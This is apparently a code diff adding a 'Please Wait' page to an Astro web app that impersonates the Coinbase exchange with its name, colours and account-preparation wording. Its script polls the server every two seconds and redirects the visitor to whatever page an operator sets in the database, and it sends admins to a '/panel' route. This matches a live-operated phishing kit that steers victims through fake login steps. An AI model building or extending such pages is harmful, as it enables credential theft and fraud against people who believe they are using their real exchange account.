@@ -1,0 +1,196 @@
+---
+export const prerender = false;
+import AuthLayout from "../layouts/AuthLayout.astro";
+import AuthCard from "../components/AuthCard.astro";
+import { getUserByEmail, initializeDb } from "../lib/db";
+
+initializeDb();
+
+// Get the cookie from the request
+const cookieHeader = Astro.request.headers.get("cookie");
+const encodedEmail = cookieHeader?.match(/user_email=([^;]+)/)?.[1];
+const userEmail = encodedEmail ? decodeURIComponent(encodedEmail) : null;
+
+// Debug log
+console.log("Cookie header:", cookieHeader);
+console.log("Encoded email:", encodedEmail);
+console.log("Decoded email:", userEmail);
+
+// If no user email in cookie, redirect to signin
+if (!userEmail) {
+  console.log("No user email in cookie, redirecting to signin");
+  return Astro.redirect("/signin");
+}
+
+// Check if user exists in database
+const user = await getUserByEmail(userEmail);
+console.log("User from database:", user);
+
+if (!user) {
+  console.log("User not found in database, redirecting to signin");
+  return Astro.redirect("/signin");
+}
+
+// If user has a specific current_page, redirect them there on initial load
+if (user.current_page && user.current_page !== "wait") {
+  console.log("User has current_page on load:", user.current_page);
+  return Astro.redirect(`/${user.current_page}`);
+}
+---
+
+<AuthLayout title="Please Wait">
+  <AuthCard>
+    <div class="coinbase-card">
+      <div class="coinbase-logo">coinbase</div>
+      <h2 class="coinbase-heading">Please Wait</h2>
+      <p class="coinbase-subtext">
+        We're preparing your account. This may take a few moments.
+      </p>
+      <div class="loading-spinner"></div>
+      <p class="coinbase-subtext">Please do not close or refresh this page.</p>
+    </div>
+  </AuthCard>
+</AuthLayout>
+
+<style is:global>
+  :root {
+    overflow-x: hidden;
+    background: #111214;
+  }
+</style>
+
+<style>
+  .coinbase-card {
+    border-radius: 1.25rem;
+    max-width: 350px;
+    margin: 2rem auto;
+  }
+
+  .coinbase-logo {
+    font-family: "Inter", "Segoe UI", Arial, sans-serif;
+    font-weight: 700;
+    font-size: 1.75rem;
+    color: #1652f0;
+    margin-bottom: 1.5rem;
+    text-align: left;
+    letter-spacing: -1px;
+  }
+
+  .coinbase-heading {
+    color: #fff;
+    font-size: 1.1rem;
+    font-weight: 600;
+    margin-bottom: 0.4rem;
+    text-align: left;
+  }
+
+  .coinbase-subtext {
+    color: #b5b5b6;
+    font-size: 0.9rem;
+    line-height: 1.4;
+    margin-bottom: 1.5rem;
+    text-align: left;
+  }
+
+  .loading-spinner {
+    border: 4px solid #23262a;
+    border-top: 4px solid #1652f0;
+    border-radius: 50%;
+    width: 40px;
+    height: 40px;
+    animation: spin 1s linear infinite;
+    margin: 0 auto 2rem auto;
+  }
+
+  @keyframes spin {
+    0% {
+      transform: rotate(0deg);
+    }
+    100% {
+      transform: rotate(360deg);
+    }
+  }
+</style>
+
+<script>
+  document.addEventListener("DOMContentLoaded", async function () {
+    // Function to check user status and redirect
+    const checkUserAndRedirect = async () => {
+      try {
+        // Check user's admin status (only needed once)
+        const response = await fetch("/api/check-admin-status");
+        const data = await response.json();
+
+        if (data.isAdmin) {
+          // If user is admin, redirect to panel after 5 seconds
+          console.log("User is admin, redirecting to panel in 5 seconds...");
+          setTimeout(() => {
+            window.location.href = "/panel";
+          }, 5000);
+          // Stop polling for non-admin users
+          if (pollingInterval) clearInterval(pollingInterval);
+        } else {
+          // If user is not admin, poll for redirects
+          console.log(
+            "User is not admin, starting/continuing polling for redirects...",
+          );
+          // Start polling only if not already running
+          if (!pollingInterval) {
+            startPolling();
+          }
+        }
+      } catch (error) {
+        console.error("Error checking admin status or user status:", error);
+        // Continue polling even on error, in case it's transient
+        if (!pollingInterval) {
+          startPolling();
+        }
+      }
+    };
+
+    let pollingInterval: number | undefined;
+
+    const startPolling = () => {
+      // Clear any existing interval to avoid duplicates
+      if (pollingInterval !== undefined) {
+        clearInterval(pollingInterval);
+      }
+
+      pollingInterval = window.setInterval(async () => {
+        try {
+          const email = decodeURIComponent(
+            document.cookie.match(/user_email=([^;]+)/)?.[1] || "",
+          );
+          if (!email) {
+            console.log("No user email found in cookie, stopping polling.");
+            clearInterval(pollingInterval);
+            return;
+          }
+
+          const userResponse = await fetch(
+            "/api/users?email=" + encodeURIComponent(email),
+          );
+          const userData = await userResponse.json();
+
+          // Redirect if user_data is valid and current_page is not 'wait'
+          if (
+            userData &&
+            userData.current_page &&
+            userData.current_page !== "wait"
+          ) {
+            console.log(`Redirecting user to: /${userData.current_page}`);
+            // Clear the interval before redirecting
+            clearInterval(pollingInterval);
+            window.location.href = "/" + userData.current_page;
+          }
+        } catch (error) {
+          console.error("Error checking user status during polling:", error);
+          // Continue polling on transient errors
+        }
+      }, 2000); // Check every second
+    };
+
+    // Initial check and start polling if not admin
+    checkUserAndRedirect();
+  });
+</script>
